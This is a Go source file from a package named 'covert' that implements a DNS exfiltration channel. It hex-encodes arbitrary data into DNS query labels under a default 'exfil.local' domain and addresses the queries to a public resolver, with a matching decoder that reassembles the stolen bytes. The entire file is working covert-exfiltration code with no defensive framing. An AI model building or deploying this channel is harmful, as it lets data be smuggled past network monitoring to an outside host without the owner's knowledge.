package covert

import (
	"encoding/hex"
	"fmt"
	"strings"
)

const (
	dnsMaxLabelLen  = 63
	dnsMaxLabels    = 3
	dnsChunkSize    = dnsMaxLabelLen * dnsMaxLabels
	dnsBitsPerQuery = dnsChunkSize / 2
)

type DNSChannel struct {
	domain string
}

func NewDNSChannel(domain string) *DNSChannel {
	return &DNSChannel{domain: domain}
}

func (c *DNSChannel) Name() string { return "dns" }

func (c *DNSChannel) Bandwidth() int { return 800 }

func (c *DNSChannel) Encode(data []byte) ([]Packet, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty payload")
	}

	domain := c.domain
	if domain == "" {
		domain = "exfil.local"
	}

	encoded := hex.EncodeToString(data)

	var packets []Packet
	seqID := generateSequenceID()
	idx := 0

	for i := 0; i < len(encoded); i += dnsChunkSize {
		end := min(i+dnsChunkSize, len(encoded))
		chunk := encoded[i:end]

		var labels []string
		for j := 0; j < len(chunk); j += dnsMaxLabelLen {
			labelEnd := min(j+dnsMaxLabelLen, len(chunk))
			labels = append(labels, chunk[j:labelEnd])
		}

		query := fmt.Sprintf("%s.%d.%08x.%s", strings.Join(labels, "."), idx, seqID, domain)

		packets = append(packets, Packet{
			Data:    []byte(query),
			DstAddr: "8.8.8.8",
			DstPort: 53,
			Proto:   "udp",
		})
		idx++
	}

	return packets, nil
}

func (c *DNSChannel) Decode(packets []Packet) ([]byte, error) {
	if len(packets) == 0 {
		return nil, fmt.Errorf("no packets to decode")
	}

	domain := c.domain
	if domain == "" {
		domain = "exfil.local"
	}
	suffix := "." + domain

	var hexParts []string
	for _, pkt := range packets {
		query := string(pkt.Data)
		if !strings.HasSuffix(query, suffix) {
			continue
		}
		query = strings.TrimSuffix(query, suffix)

		parts := strings.Split(query, ".")
		if len(parts) < 3 {
			continue
		}

		hexLabels := parts[:len(parts)-2]
		hexParts = append(hexParts, strings.Join(hexLabels, ""))
	}

	combined := strings.Join(hexParts, "")
	data, err := hex.DecodeString(combined)
	if err != nil {
		return nil, fmt.Errorf("hex decode: %w", err)
	}
	return data, nil
}
